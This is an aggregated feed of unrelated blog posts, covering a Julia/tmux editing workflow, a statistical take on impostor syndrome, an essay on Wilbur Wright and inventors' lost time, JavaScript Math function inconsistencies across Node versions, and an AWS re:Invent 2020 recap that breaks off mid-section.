<p>Here, I target my Julia REPL in a tmux panel and use the <code>vim-slime</code> plugin to send code from my Julia script opened in neovim to the Julia REPL for rapid evaluation. 
This config works for any time you want to target a window.
This also works for code chunks such as functions or loops!</p>

<h2 id="conclusion">Conclusion</h2>

<p>I hope you found my workflow and toolchain interesting!
My dream would be for this workflow to serve as inspiration for your own workflow.
Make it your own and all the best!</p>

<![CDATA[A quantitative explanation of impostor syndrome]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><em>(Note: Throughout, I’m going to be loose with my phrasing and say things like “X is 10% as good as Y,” where X and Y are people. But we all know reality isn’t this simple.)</em></p>

<p>You’ve probably heard of <a href="https://en.wikipedia.org/wiki/Impostor_syndrome">impostor syndrome</a>. Maybe you’ve even experienced it: you don’t think you can meet other people’s expectations, and sooner or later, everyone’s going to find out that you’re an incompetent loser. And then, of course, your life will be completely ruined. Something like that.</p>

<p>To make the situation more stressful, you can’t tell if you have impostor syndrome (IS) or if you’re <em>actually</em> a loser. After all, <em>thinking</em> that you’re a loser is the defining symptom of IS.</p>

<p>It’s kind of like a real-life <a href="https://en.wikipedia.org/wiki/Barber_paradox">barber paradox</a>: suppose a barber shaves those who don’t shave themselves. Does he shave himself? Either answer leads to a paradox. Except in your situation, you fear that there’s actually no paradox: you <em>think</em> you’re a loser, and you don’t have IS because you actually <em>are</em> a loser.</p>

<!--more-->

<p>So what can we do about it? Unfortunately, I think most of the common “solutions” are unsatisfying. Allow me to illustrate from the perspective of a (petulant) victim.</p>
<ul>
  <li><strong>“Know that it’s common.”</strong> Listen, it doesn’t matter how many people have imposter syndrome. Like I said, I’m <em>actually</em> a loser.</li>
  <li><strong>“Talk to others about it.”</strong> What if they have no idea what I’m talking about? Or worse, what if they also think I’m a loser, but they’re too polite to tell me?</li>
  <li><strong>“Stop comparing yourself to others.”</strong> I’m <em>sure</em> my interviewer isn’t comparing me to other applicants. Because each one of us is a unique snowflake. Sheesh.</li>
  <li><strong>“Own your successes and praise you receive.”</strong> Do I even need to say anything? I don’t have any successes, and nobody praises me.</li>
</ul>

<p>In my opinion, these “solutions” only apply if you’re <em>not</em> actually an imposter. They don’t address the crux of IS: what if you actually <em>are</em> an imposter?</p>



<p>Instead of focusing on <em>how</em> we can “overcome” IS, let’s first consider <em>why</em> we experience it in the first place. Then, maybe, we can actually overcome it. After all, you need to inspect your car before you can fix it.</p>

<p>(Of course, I’m sure there are psychological factors that cause some people to experience IS more severely than others. But for now, I’d like to discuss a more quantitative explanation.)</p>

<p>The main idea is this: <strong>reality is not <a href="https://en.wikipedia.org/wiki/Normal_distribution">normal</a>(ly distributed)</strong>. In other words, our mental models of reality are often inaccurate, and this leads to unsound conclusions.</p>

<p>When we think about measurements, our minds often default to the “bell curve.” After all, our heights, weights, and IQ scores all follow this curve.</p>

<p>The most familiar example is the score distribution for a college course: there are typically lots of scores around 80, some in the intervals 70-75 and 85-90, and relatively few scores in the 60’s and 90’s.</p>

<p>

<p>However, real-life evaluations (unlike college exams) <a href="https://www.npr.org/2012/05/03/151860154/put-away-the-bell-curve-most-of-us-arent-average">aren’t designed</a> to produce a bell curve. Furthermore, there’s usually no notion of a “maximum” score, so the “gaps” among the top scores could be arbitrarily large. For example, there is (virtually) no universal upper bound on the number of awards someone can receive, the number of papers they’ve published, or the amount of money they have.</p>

<p>As a result, the <a href="https://www.forbes.com/sites/joshbersin/2014/02/19/the-myth-of-the-bell-curve-look-for-the-hyper-performers"><em>actual</em> curve</a> for performance is a <a href="https://en.wikipedia.org/wiki/Power_law">power-law</a> distribution: lots of low scores, and a few super-high scores.</p>

<p>

<br>
<b>Figure 2.</b> A distribution for performance in the "real world." There are still 100 "students," but now there's less symmetry and no cap on the maximum possible score.
</p>

<p>Figures 1 and 2 both include 100 people, but the curves are obviously very different. So if you think your situation is Figure 1, but it’s actually Figure 2, then any conclusions you draw will probably be incorrect. Let’s see some of the differences.</p>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Figure 1 (“normal”)</th>
      <th>Figure 2 (“actual”)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>People below average</td>
      <td>46%</td>
      <td>70%</td>
    </tr>
    <tr>
      <td>Average score vs. #1 score</td>
      <td>81.6%</td>
      <td>14.1%</td>
    </tr>
    <tr>
      <td>People below 10% of the #1 score</td>
      <td>0%</td>
      <td>59%</td>
    </tr>
    <tr>
      <td>Top 10% score vs. #1 score</td>
      <td>90.8%</td>
      <td><strong>39.2%</strong></td>
    </tr>
    <tr>
      <td>Total score of top 10% vs. total score</td>
      <td>11.3%</td>
      <td>41.4%</td>
    </tr>
  </tbody>
</table>

<p>To me, the most striking statistic is the fourth row: let’s say you’re the tenth highest scorer. In a normal classroom setting, you’d be almost 91% as good as the top scorer. But outside the classroom, you’re only 39% as good.</p>

<p>And chances are, you’re not in the top 10% — you’re probably not even average, since 70% of people are below average (according to Figure 2). In fact, more likely than not, <em>you’re not even 10% as good as the best student</em>. If classroom scores reflected reality, you wouldn’t even score a 9/100. That’s terrible! You must be an imposter!</p>

<p>The good news is this: by the same reasoning, lots of <em>other</em> people are <em>also</em> imposters. I mean, 90% of people are only contributing 59% of the points. So if you still think you’re not “good enough,” remember that most people, on average, aren’t carrying their weight either.</p>

<p>The other good news is this: if you even <em>consider</em> yourself as part of some “actual” distribution like Figure 2 (even if you’re at the bottom), then you’re being plotted against a group of high performers. Don’t forget that there’s actually a <em>huge</em> number of people who aren’t even good enough to be on the chart.</p>



<p>Let’s see an actual example of the “actual” distribution in professional basketball. Each year in the NBA, a handful of players are recognized as “All-Stars” for their exceptional performance that season; many players are selected multiples times throughout their careers. Here’s the plot for <a href="https://www.basketball-reference.com/awards/all_star_by_player.html">total All-Star game selections</a> (1951-2020).</p>

<p>
<img src="https://nusnivek.com/assets/figs/imposter-syndrome/nba.png">
<br>
<b>Figure 3.</b> There's been a total of 503 All-Stars, and the maximum number of appearances is 19 (set by <a href="https://en.wikipedia.org/wiki/Kareem_Abdul-Jabbar">Kareem Abdul-Jabbar</a>).
</p>

<p>Now let’s fill out our table for this figure.</p>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Figure 1 (“normal”)</th>
      <th>Figure 2 (“actual”)</th>
      <th>Figure 3 (actual “actual”)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>People below average</td>
      <td>46%</td>
      <td>70%</td>
      <td>60.2%</td>
    </tr>
    <tr>
      <td>Average score vs. #1 score</td>
      <td>81.6%</td>
      <td>14.1%</td>
      <td>19.8%</td>
    </tr>
    <tr>
      <td>People below 10% of the #1 score</td>
      <td>0%</td>
      <td>59%</td>
      <td>33.2%</td>
    </tr>
    <tr>
      <td>Top 10% score vs. #1 score</td>
      <td>90.8%</td>
      <td>39.2%</td>
      <td>42.1%</td>
    </tr>
    <tr>
      <td>Top 10% vs. total</td>
      <td>11.3%</td>
      <td>41.4%</td>
      <td>31.4%</td>
    </tr>
  </tbody>
</table>

<p>The numbers aren’t <em>quite</em> as telling as they are for Figure 2, but the idea is the same. The average All-Star is better than 60% of all All-Stars. A third of all All-Stars aren’t even 10% as good as the highest-scoring All-Star (who, coincidentally, is also the current leader in NBA career points). Even a top 10% All-Star is only 42% as good as him. And so on.</p>

<p>So if you’re a first-time All-Star, maybe you’re looking at Figure 3 and thinking you’re a loser. After all, you <em>are</em> in that 60.2% of “people below average.” And you’re only 6% as good as Kareem, the #1 All-Star. But keep in mind that there’s a <em>huge</em> spike at “0” that’s not in Figure 3, and you’re better than all of those people (at being an All-Star, at least).</p>

<p>But if you <em>are</em> in the “0” spike, then you’re <em>still</em> better than the top <a href="http://www.ncaa.org/about/resources/research/mens-basketball-probability-competing-beyond-high-school">1.2%</a> of college players. And if you’re a college player, then you’re <em>still</em> better than the top 3.5% of high school players. Each level contains the best players from the previous level. (Of course, some top players choose to quit basketball early, but I believe this is uncommon.)</p>



<p>So you think you’re a loser — <em>way</em> worse than your top peers. You think their score is 100, and your score is 0. According to the normal distribution, most scores are around 40-60. So naturally, you conclude that pretty much <em>everyone</em> is way ahead of you.</p>

<p>But here’s the catch: real-life performance does <em>not</em> follow a normal distribution. Instead, it follows a power-law distribution. And based off this distribution, we can make some counterintuitive conclusions, such as the following.</p>

<ol>
  <li>A super-majority of students are below average.</li>
  <li>The average student is <em>much</em> worse than the top student.</li>
  <li>Most students, <em>including many top students</em>, are not even close to the top student.</li>
</ol>

<p>Now, “feeling like a loser” sounds pretty justified. But that doesn’t make the feeling go away. So what should we call it?</p>

<p>Let’s call it “feeling the tail” instead (like “feeling the burn,” but more abstract). By “tail,” I’m referring to the “right side” of Figures 1 and 2, i.e., the part where the curve tapers off. (In Figure 1, the tail is roughly 85-100; in Figure 2, it’s 5-110). Thinking that you’re far from the tip makes sense: real-world distributions have <a href="https://en.wikipedia.org/wiki/Long_tail">longer tails</a> than normal distributions.</p>

<p>When you accomplish something (e.g., get hired, receive new responsibilities, become an NBA All-Star), you’re now competing with a new set of people — people who have also accomplished this thing. As you stand at the top of your new curve, on the skyscraper at “0” or “1,” you see the high-scorers, way out in the distance. “Who are these people, and how are their scores so high? Do I even belong here? Where are my fellow low-scorers?” Lost and afraid on this curve, you feel like a loser.</p>

<p>But don’t forget (cue the inspirational music) — you’re on this curve because you <em>accomplished</em> something. Becoming aware of those high-scorers means you’ve <em>progressed</em>. Maybe you can’t see them, but there are <em>lots</em> of people in a position similar to yours. So perhaps you shouldn’t feel like a loser — you’re just feeling the tail.</p>

December 3, 2020 | https://applieddivinitystudies.com/murder-of-wilbur/ | <a href="https://web.archive.org/web/*/https://applieddivinitystudies.com/murder-of-wilbur/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
       <p>How many of our greatest minds have we lost?</p>
<p>From The Dream Machine (p50) on John Atanasoff:</p>
<blockquote>
<p><strong>He was determined to build a computing machine… But with all his teaching responsibilities, he’d had very little time to focus on the problem.</strong> Finally, however, on a bitterly cold winter night in late 1937, he just couldn’t take it anymore; he had to get away to concentrate. So he jumped into his car in Ames, Iowa, and drove east through the subzero temperature at more than eighty miles per hour. Almost three hours later, after he crossed the Mississippi River into Illinois, he stopped at a roadhouse to warm up. And there, somewhere between his first and second bourbons, he conceived four crucial ideas to make him computer work.”</p>
</blockquote>
<p>Incredible! Atanasoff was busy, but finally got down to doing the thing he really loved, the world recognized his genius, and he was given all the resources he needed to complete his work.</p>
<p>At least, that’s what would have happened in any reasonable society. Instead, we’re told:</p>
<blockquote>
<p>Atanasoff didn’t develop his invention any further, as it happened. Soon after the United States entered the war, in December 1941, he went to the Naval Ordinance Laboratory in Washington, D.C., where he supervised the counting testing of mines. <strong>He never returned to computing.</strong></p>
</blockquote>
<p>Who knows what else he could have given us? Instead, his entire lifetime produces one brief period of real scientific producitivity, bookended by teaching responsibilities and war.</p>
<p>Once you start looking, these stories are everwhere. Here’s <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/History_of_Unix">The Daemon, the Gnu and the Penguin</a> on the invention of Unix:</p>
<blockquote>
<p>In August 1969, Ken Thompson’s wife Bonnie took their year-old son on a trip to California to show off to their families. As a temporary bachelor, Ken had time to work. “I allocated a week each to the operating system, the shell, the editor and the assembler [he told me]… and during the month she was gone, it was totally rewritten in a form that looked like an operating system”</p>
</blockquote>
<p>Maybe this is a greatly exaggerated myth, but how terrifying would it be if that was true? Is it possible that Thompson was burdened by responsibilities his entire life, and then in a brief moment of freedom did some of the most important work anyone has ever done?</p>
<p>And then from <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wright_brothers#Wilbur">Wikipedia</a>, on Wilbur Wright:</p>
<blockquote>
<p>…Wilbur never flew again. He gradually became occupied with business matters for the Wright Company and dealing with different lawsuits. Upon dealing with the patent lawsuits, which had put great strain on both brothers, Wilbur had written in a letter to a French friend, “<strong>When we think what we might have accomplished if we had been able to devote this time to experiments, we feel very sad</strong>, but it is always easier to deal with things than with men, and no one can direct his life entirely as he would choose.”</p>
</blockquote>
<p>But why on earth not? Why couldn’t Wilbur Wright, now admired as one of history’s greatest investors, find time to continue his most important work? The story continues:</p>
<blockquote>
<p>Wilbur spent the next year before his death traveling, where he spent a full six months in Europe attending to various business and legal matters… He was also constantly back and forth between New York, Washington and Dayton. All of the stresses were taking a toll on Wilbur physically. Orville would remark that he would “come home white”.</p>
</blockquote>
<p>Then finally:</p>
<blockquote>
<p>After returning to Dayton in early May 1912, worn down in mind and body, he fell ill again and was diagnosed with typhoid fever. He lingered on, his symptoms relapsing and remitting for many days. Wilbur died, at age 45, at the Wright family home on May 30.</p>
</blockquote>
<p>These were some of the most brilliant minds we had, and they were each nearly unable to fulfil even a tiny fraction of their potential. We should ask how much more each of them could have accomplished, but also how much we’ve lost from would-be inventors unable to find even a month of genuine free time with which to pursue their dreams. And of course, how many have been effectively barred from research by poverty or discrimination.</p>
<p>What hits me hardest is not the material loss, but the squandering of human spirit. As <a target="_blank" rel="noopener" href="https://vimeo.com/115154289">Bret Victor once explained</a>:</p>
<blockquote>
<p>We recognize that a dog has to be allowed the full free expression of its entire range of capabilities. Sticking him in a cage or constraining his range of experience, you’re not letting him do all the things that dogs can do. And this is exactly what we’ve done to ourselves.</p>
</blockquote>
<p>And so the stories above strike me not even as tragedies, but as something more inhumane.</p>
<p>My greatest fear is that intelligent life will arrive on earth. It won’t be an invasion, or colonization, or anything horrible. They’ll just sit us down, and ask about the lives of our heroes.</p>
<p>We’ll proudly tell them about this guy Wilbur Wright. How he and his brother invented a machine to fly in the sky as gods. We’ll tell them about our culture of research and innovation, and how Wilbur, self-taught engineer from Ohio, changed the entire world.</p>
<p>And then we’ll have to explain how gruesomely we murdered him.</p>
<p>Not with sticks and stones, but with a barrage of patent lawsuits. We will have to tell the aliens how we used this great system of socially legitimate torture to slowly wear him down over the years.</p>
<p>We will tell them how in the end, poor brilliant Wilbur became old and tired and incapable of producing anything beautiful ever again.</p>
<p>I do not think they will forgive us. I am not sure we should forgive ourselves.</p>
<hr>
<p><strong>See Also</strong><br><a target="_blank" rel="noopener" href="https://guzey.com/patronage-and-research-labs/">Reviving Patronage and Revolutionary Industrial Research</a></p>
<hr>
<p><em>Yes, I understand that Wilbur also sued people. I’m not claiming that he was a good person. My point is that in a humane world, no part of this story would even be possible.</em></p>

            <p>If you are feeling overwhelmed, and your first response to that is to work longer hours, you are doing it wrong.</p><p>What to do instead:</p><ol><li><strong>Find the most significant reason for being overwhelmed.</strong> Find the one thing that contributes to 80% (or most) of the workload stress. Classify that one thing as urgent, or critical, or none. Act accordingly.</li><li><strong>Set basic rules.</strong> I say no to all tasks that take up too much time but add significantly less value. I also adhere to a start and end time of my work-day; this is even more important during WFH.</li><li><strong>Don't be a hero.</strong> Don't take up more work than you should. Second - everything doesn't have to be perfect. As Sheryl Sandberg said, <em>"Done is better than perfect."</em> Answer this question to decide if you should put in more time or not: "What is the incremental value of spending more time on this task?"</li><li><strong>Delegate, whenever possible.</strong> Don't do tasks that don't deserve your time and attention. Yes, no job is too small, but some tasks are less critical and can be done by others. Identify such tasks, then find the right person to do it, and then delegate.</li><li><strong>Ask for help.</strong> There are more people than you think who are willing to help. All you need to do is ask.</li></ol>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>This is a written version of a talk that I gave at <a href="https://wafflejs.com/">WaffleJS</a> in February, which itself was an expansion of a <a href="https://twitter.com/tmcw/status/1187782634623000576">Twitter conversation</a> from October.</em></p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.webp" type="image/webp"><img alt="Math education" src="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.jpg"></picture></p><p>Okay, so it starts with my delayed math education. As part of my Computer Science program, I had access to world-class math professors, access that I mostly wasted. I didn’t like math: the topics were so removed from practice, and I was already frustrated by the highly theoretical, and – I thought at the time and mostly still do – out-of-touch CS program.</p><p>Unfortunately, a few years after graduating, I got the hunger for math. Seeing how I could apply just a little bit of math knowledge to great effect in my work &amp; hobbies had me inspired. But I had no clear way of learning it.</p><p>So I <a href="https://macwright.com/2012/06/26/simple-statistics.html">started Simple Statistics in 2012</a> as a way to learn math, and ever since then, I’ve expanded and maintained the project. It now includes a lot of different algorithms, is one of the most ‘starred’ JavaScript math projects, and presumably is used by people.</p><p>But I started it in 2012. In tech years that’s a really long time ago. Between then and now, there have been 8 LTS releases of <a href="https://nodejs.org/en/">Node</a>. JavaScript and its environments have radically changed. 2012 was before the introduction of React or the first commit to Babel.</p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.webp" type="image/webp"><img alt="Time passing" src="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.jpg"></picture></p><p>So what I noticed over the years was that tests kept breaking when I updated Node. I’d have a test like:</p><div><div><pre><code><span>t</span><span>.</span><span>equal</span><span>(</span><span>ss</span><span>.</span><span>gamma</span><span>(</span><span>11.54</span><span>),</span> <span>13098426.039156161</span><span>);</span>
</code></pre></div></div><p>That would work in Node v10 and break in Node v12. And this is not some complex method: gamma is implemented with arithmetic, Math.pow, Math.sqrt, and Math.sin.</p><h3 id="arithmetic">Arithmetic</h3><p>So I know what you might be thinking: arithmetic. JavaScript, on Twitter, gets a lot of heat for this behavior:</p><div><div><pre><code>0.1 + 0.2 = 0.30000000000000004
</code></pre></div></div><p>As I wrote in <a href="https://macwright.com/2017/07/29/javascript-wats-dissected.html#numbers-are-weird">JavaScript wats, dissected</a>, this is the behavior of every popular programming language, even stodgy pedantic ones like Haskell. Floating point arithmetic might be weird, but it’s very consistent and well-specified: the <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE 754</a> specification is rigorously implemented. So it’s not arithmetic: addition, subtraction, division, and multiplication are pretty set in stone.</p><h3 id="math">Math</h3><p>What it was, was Math. In particular, all of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math">the methods that come after <code>Math.</code></a></p><p>Methods like Math.sin, Math.cos, Math.exp, Math.pow, Math.tan: <a href="https://macwright.com/2013/03/05/math-for-pictures.html">essential ingredients for geometry</a> and basic computation. I started isolating changes in basic function behavior between versions. For example:</p><p>Calculating Math.tanh(0.1)</p><div><div><pre><code>// Node 4
0.09966799462495590234
// Node 6
0.09966799462495581907
</code></pre></div></div><p>Calculating Math.pow(1/3, 3)</p><div><div><pre><code>// Node 10
0.03703703703703703498
// Node 12
0.03703703703703702804
</code></pre></div></div><p>To make matters worse, it’s not just Node’s behavior that’s changing: so are browsers and other places you use JavaScript.</p><p>So this led to the question: <strong>what

coordinates on the rim, and that they’ll draw little squigglies if plotted on X &amp; Y. Actually <em>deriving</em> those methods is what you’ll learn in advanced classes, but the method that you use - the <a href="https://en.wikipedia.org/wiki/Taylor_series">Taylor series</a> - relies on an <em>infinite</em> series, which would be rather laborious for a computer to solve.</p><blockquote><p>“There is no standard algorithm for calculating sine. IEEE 754-2008, the most widely used standard for floating-point computation, does not address calculating trigonometric functions such as sine.”</p></blockquote><p>-<a href="https://en.wikipedia.org/w/index.php?title=Sine&amp;oldid=939445047#Software_implementations">Wikipedia</a></p><p>Computers use a variety of different estimations and algorithms to do math, things like <a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> and various cheating algorithms and lookup tables. This heterogeny explains all of the <a href="https://github.com/search?q=fastmath">‘fastmath’</a> libraries you can find on GitHub: there’s more than one way to implement Math.sin. Famously, Quake III Arena used a <a href="https://en.wikipedia.org/w/index.php?title=Fast_inverse_square_root&amp;oldid=940101226">faster replacement for the inverse square root method</a> in order to speed up rendering.</p><p>So math is implemented as algorithms, and there are multiple common algorithms –&nbsp;and variations of those algorithms –&nbsp;used in practice.</p><p>Instead of telling implementations to pick an algorithm, the JavaScript specification grants them a <em>lot</em> of wiggle room in terms of how they implement these basic functions.</p><blockquote><p>The behaviour of the functions acos, acosh, asin, asinh, atan, atanh, atan2, cbrt, cos, cosh, exp, expm1, hypot, log,log1p, log2, log10, pow, random, sin, sinh, sqrt, tan, and tanh is not precisely specified here except to require specific results for certain argument values that represent boundary cases of interest.</p></blockquote><p>-<a href="https://www.ecma-international.org/ecma-262/10.0/index.html#sec-function-properties-of-the-math-object">ECMA-262, 10th edition, section 20.2.2 aka “JavaScript”</a></p><p>I don’t know the inner workings of the standards committees, but I imagine they wanted to make sure that just in case Intel or AMD introduce super-fast new math instructions in a new processor, JavaScript wouldn’t have a compatibility crisis.</p><p>Because there are a lot of JavaScript interpreters that are commonly used, because JavaScript is often used via web browsers and there still is some competition between web browsers, and because even popular JavaScript implementations are under pressure to evolve quickly to be the most performant…&nbsp;because of all that, this matters. You actually will encounter, on a regular basis, differences in math.</p><p>This doesn’t matter as much in other interpreted languages, because they tend to have ‘canonical’ interpreters: most of the time you use the Python interpreter of the Python language.</p><h3 id="where-math-happens">Where math happens</h3><p>Next let’s zoom into <em>where</em> these math implementations live. See, in JavaScript, there are three places where basic math can happen:</p><ol><li>The CPU</li><li>The language interpreter (the C++ and C code that underlies JavaScript implementations)</li><li>In software itself, as a library</li></ol><p><strong>1: The CPU</strong></p><p>This was my first guess: I assumed that since CPUs implement arithmetic, they might implement some higher-level math. It turns out that CPUs do have instructions to do trigonometry and other operations, but they’re rarely invoked. The CPU (x86) implementation of sine doesn’t get much love because it’s not reliably faster than an implementation in software (using arithmetic operations on the CPU), nor as accurate.</p><p>Intel also bears some blame for <a href="https://randomascii.wordpress.com/2014/10/09/intel-underestimates-error-bounds-by-1-3-quintillion/">overstating the accuracy of their trigonometric operations</a> by many magnitudes. That kind of mistake is especially tragic because, unlike software, you can’t patch chips.</p><p><strong>2: The language interpreter</strong></p><p>This is how most of the implementations do it, and they implement math in a variety of ways.</p><ul><li>V8 &amp; SpiderMonkey use (slightly different) ports of the <a href="https://www.netlib.org/fdlibm/">fdlibm</a> library for most operations. It has been passed down through the generations, originally written at Sun Microsystems.</li><li>JavaScriptCore (Safari) uses cmath for most operations.</li><li>Internet Explorer used some cmath, but <a href="https://github.com/microsoft/ChakraCore/blob/d86452259dd534718b7eb9ce024ed35aefd33036/lib/Runtime/Library/MathLibrary.cpp#L1028-L1047">also used some assembly instructions and actually <em>did</em> use CPU-provided trig methods</a> when it was compiled for CPUs that had them.</li></ul><p>Historically, all of these implementations have shifted: V8 used to use a homegrown solution for math, and then used <a href="https://github.com/v8/v8/blob/ff7975aa8d1ff6f0904f0f5112d17ea819466983/src/math.js">a port of fdlibm to JavaScript</a>, before finally settling on fdlibm in C.</p><h3 id="why-this-is-an-issue">Why this is an issue</h3><p>Here’s why this is a problem: it chips away at JavaScript’s ability to give consistent results to any problem including mathematics. And that especially hits <em>data science</em>. I want JavaScript to be a contender for data science in the browser, and – amongst some other issues, like number types and a confounding lack of a commonly-used data-frames library –&nbsp;an inability to produce replicable results means adding more crisis to the <a href="https://en.wikipedia.org/wiki/Replication_crisis">replication crisis</a> in the sciences.</p><h3 id="the-third-way">The third way</h3><p>There is a way out that we can use today. <a href="https://github.com/stdlib-js/stdlib">stdlib</a> is a JavaScript library that reimplements higher-level math using arithmetic alone. Arithmetic is fully-specified and standard, so the results that stdlib gives you are also fully consistent, across all the platforms.</p><p>This comes at the cost of complexity and speed: stdlib isn’t consistently as fast as built-in methods, and you’ll need to require a library ‘just’ to compute sine.</p><p>But in the wider view, this is pretty normal! WebAssembly, for example, doesn’t give you higher-level math methods at all and recommends you include a math implementation in your modules themselves:</p><blockquote><p>“WebAssembly doesn’t include its own math functions like sin, cos, exp, pow, and so on. WebAssembly’s strategy for such functions is to allow them to be implemented as library routines in WebAssembly itself (note that x86’s sin and cos instructions are slow and imprecise and are generally avoided these days anyway).”</p></blockquote><p>And this is the way that compiled languages have always worked: when you compile a C program, the methods you import from <code>math.h</code> are included in the compiled binary.</p><h3 id="using-an-epsilon">Using an epsilon</h3><p>If you don’t want to include stdlib to do math but you do want to test math-heavy code, you’ll probably have to do what simple-statistics does right now: use an epsilon. Of the <a href="https://en.wikipedia.org/w/index.php?title=Epsilon&amp;oldid=938802001#Symbol">5+ uses of epsilon in math</a>, the one I’m referring to is “an arbitrarily small positive quantity”. It’s a tiny number. Here’s <a href="https://github.com/simple-statistics/simple-statistics/blob/727eaed049af4f788fb2299e5c8263573618e78c/src/epsilon.js#L35">simple-statistics’s implementation</a>: the number 0.0001.</p><p>You then compare <code>Math.abs(result - expected) &lt; epsilon</code> to make sure you got within range of the desired value, with a little bit of wiggle room.</p><h3 id="the-moral-of-the-story">The moral of the story</h3><p>Here’s where I was a little short on time in person and have some room to expand.</p><p><em>First, what’s under the hood is rarely what you expect.</em> Our current tech stack is heavily optimized and a lot of optimizations are really just dirty tricks. For example, the number of hardware instructions it takes to solve <code>Math.sin</code> varies based on the input, because there are lots of special cases. When you get to more complex cases, like ‘sorting an array’, there are often multiple algorithms that the interpreter chooses between in order to give you your final result. Basically, the cost of anything you do in an interpreted language is variable.</p><p><em>Second, don’t trust the system too much.</em> What I was seeing between Node versions really <em>should</em> have been a bug in the testing library, or something in my code, or maybe in simple-statistics itself. But in this case, digging deeper revealed that what I was seeing was exactly what you don’t expect: a glitch in the language itself.</p></div></div>

December 3, 2020 | https://www.sentiatechblog.com/aws-re-invent-2020-day-2-aws-is-coming-to-a-data-center-or-pizza-parlor-near | <a href="https://web.archive.org/web/*/https://www.sentiatechblog.com/aws-re-invent-2020-day-2-aws-is-coming-to-a-data-center-or-pizza-parlor-near">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!-- ## AWS re:Invent 2020 Day 2: AWS is coming to a data center (or pizza parlor) near you! -->
<p>Day 2 of re:Invent 2020 brought no new releases or announcements, so in this article we will dive into another few releases from re:Invent day 1. They relate to a movement that has been going on for a while now; AWS is bringing their services closer to their users, into private data centers, 5G edge locations, hotels, and even other clouds!</p>
<h3>Outposts, Local Zones and Wavelength</h3>
<p>In 2019 AWS announced general availability of <a rel="noopener noreferrer" href="https://aws.amazon.com/Outposts/">Outposts</a>, launched the first <a rel="noopener noreferrer" href="https://aws.amazon.com/about-aws/global-infrastructure/localzones/">Local Zone</a> in Los Angeles, and introduced <a rel="noopener noreferrer" href="https://aws.amazon.com/wavelength/">Wavelength</a>. These three services / deployments have different characteristics, but they follow the same concept: they allow AWS services to run outside a full-fledged AWS region.</p>
<p>At their introduction, AWS Outposts were only available as full 42-unit racks that can be installed in data centers or office locations. These racks contain networking equipment, power supplies, storage, and one or more physical servers, for example a <code>c5.24xlarge</code> or even ten <code>r5d.24xlarge</code> hosts. These can run AWS services like EC2, RDS, ALB and S3. The two main use cases for Outposts are low latency and data residency. However, this comes at a cost: the cheapest 42U outpost is listed at $118,110.21 and the most expensive one costs a whopping $776,478.32 for a three-year period.</p>
<p>Contrary to Outposts, Local Zones are hosted in data centers owned and managed by AWS. They are much like a single availability zone, connected to a nearby region. However, where normal availability zones are located close together to achieve minimal latencies between them, Local Zones are located near densely populated areas (like LA) to achieve the lowest latency to that area.</p>
<p>Wavelength is a bit of a crossover implementation, where AWS deploys and maintains hardware in data centers owned by 5G telecom operators. These data centers are also located in or near dense urban areas, which again leads to reduced latency for these areas.</p>
<p>These three relatively new solutions have one thing in common: they bring AWS services that are historically limited to AWS regions outside of those regions to reduce latency. This also allows AWS to scale faster than by just adding new regions (which they are also doing, in India, Indonesia, Japan, Spain, and Switzerland).</p>
<h3>New announcement: 15 new Local Zones</h3>
<p>At re:Invent 2020, AWS announced (<a rel="noopener noreferrer" href="https://aws.amazon.com/about-aws/whats-new/2020/12/announcing-preview-of-aws-local-zones-in-boston-houston-and-miami/">AWS News</a> - <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/in-the-works-more-aws-local-zones/">AWS Blog</a>) that they will be adding three new Local Zones in 2020 (Boston, Houston, and Miami) . In 2021, these will be joined by another twelve local zones, among which New York City, Chicago, and Atlanta.</p>
<p>These Local Zones allow ultra-low latency for short-distance communications, for example used in gaming, financial markets, video conferencing or live sports matches.</p>
<h3>New announcement: 1U and 2U Outposts</h3>
<p>AWS also <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/reinvent-2020-preannouncements-for-tuesday-december-1/">pre-announced</a> smaller form factor Outposts. As described in the introduction, the previous smallest form factor was 42U. In 2021, Outposts will also become available in single server format: either a 1U server based on a Graviton 2 ARM CPU or a 2U Intel-based server.</p>
<p>This allows AWS customers to place Outposts in location where there is no room for a full rack, or where a full rack would simply be overkill. This might include hotels or restaurants, but also distribution centers, train stations, and whichever other place might benefit from local EC2 compute capacity. And of course, smaller Outposts will be more affordable, reducing the barrier to get started.</p>
<h3>New announcements: ECS Anywhere, EKS Anywhere, and EKS Distro (EKS-D)</h3>
<p>The Outposts, Local Zones and Wavelength technologies are all focused on hardware: actual physical devices that are installed in various locations by AWS.</p>
<p>A number of announcements on the software side are even more interesting: AWS will make the container orchestration software used in ECS and EKS available for, well, anywhere (<a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/reinvent-2020-preannouncements-for-tuesday-december-1/">AWS News</a>), and they have open sourced the Linux distribution used in EKS and named it EKS-D (<a rel="noopener noreferrer" href="https://aws.amazon.com/about-aws/whats-new/2020/12/introducing-amazon-eks-distro/">AWS News</a> - <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/amazon-eks-distro-the-kubernetes-distribution-used-by-amazon-eks/">AWS Blog</a> - <a rel="noopener noreferrer" href="https://github.com/aws/eks-distro">GitHub</a>).</p>
<h4>Why it matters</h4>
